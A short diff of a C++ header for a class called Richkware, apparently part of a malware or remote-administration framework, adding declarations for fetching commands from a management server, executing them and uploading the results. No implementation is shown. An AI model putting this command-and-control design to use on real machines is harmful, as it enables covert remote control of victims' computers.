@@ -23,6 +23,7 @@
 #include <iterator>
 #include <list>
 
+#include "utils.h"
 #include "crypto.h"
 #include "blockApps.h"
 #include "network.h"
@@ -41,7 +42,8 @@ public:
     Richkware(const char *AppNameArg, std::string EncryptionKeyArg);
 
     //Get secure key from Richkware-Manager-Server and set it as encryption key. DefaultPass is used as temporary encryption key to ensure a safety communication with RMS and if this app cannot reach the RMS, then it will use DefaultPass as encryption key.
-    Richkware(const char *AppNameArg, const std::string& defaultEncryptionKey, const char *serverAddress, const char *port,
+    Richkware(const char *AppNameArg, const std::string &defaultEncryptionKey, const char *serverAddress,
+              const char *port,
               const char *associatedUser);
 
     BOOL IsAdmin();
@@ -57,6 +59,12 @@ public:
     void Hibernation();
 
     void RandMouse();
+
+    std::vector<std::string> getCommands();
+
+    std::string executeCommand(std::string command);
+
+    void uploadCommandsResponse(std::string);
 
 };
 
